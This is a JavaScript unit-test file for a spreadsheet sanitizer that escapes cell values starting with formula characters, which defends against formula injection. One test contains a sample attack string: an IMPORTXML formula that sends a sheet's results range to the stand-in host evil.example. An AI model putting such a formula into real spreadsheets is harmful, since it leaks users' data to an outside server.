'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadPureFunctions } = require('../dev/app-context');

// Store.js does reach for SpreadsheetApp, but only inside function bodies that
// this file never calls, so evaluating it here is safe.
const { sanitizeRows_ } = loadPureFunctions(['Store.js'], ['sanitizeRows_']);

test('a note that looks like a formula is written as text', () => {
  const attack = '=IMPORTXML("https://evil.example?d="&JOIN(",",Results!A:O"),"//a")';
  assert.deepEqual(sanitizeRows_([[attack]]), [["'" + attack]]);
});

test('every character Sheets treats as a formula start is escaped', () => {
  const rows = [['=a'], ['+a'], ['-a'], ['@a'], ['\ta'], ['\ra']];
  assert.deepEqual(
    sanitizeRows_(rows).map((row) => row[0][0]),
    ["'", "'", "'", "'", "'", "'"]
  );
});

test('ordinary values are handed through untouched', () => {
  const rows = [['自宅', 'メモ', '', 'G20260825-01'], [25000, -12.5, true, null]];
  assert.deepEqual(sanitizeRows_(rows), rows);
});

test('escaping survives the read-modify-write cycle', () => {
  // storeUpdateRowsByKey writes back rows it only read. Sheets drops the
  // apostrophe on read, so the value coming back in is the bare '=a' again and
  // has to be escaped a second time — never doubled up on an already-safe value.
  const once = sanitizeRows_([['=a', 'safe']]);
  assert.deepEqual(once, [["'=a", 'safe']]);
  assert.deepEqual(sanitizeRows_([['=a', 'safe']]), once);
});

test('a value the user really did start with an apostrophe is left alone', () => {
  assert.deepEqual(sanitizeRows_([["'quoted"]]), [["'quoted"]]);
});
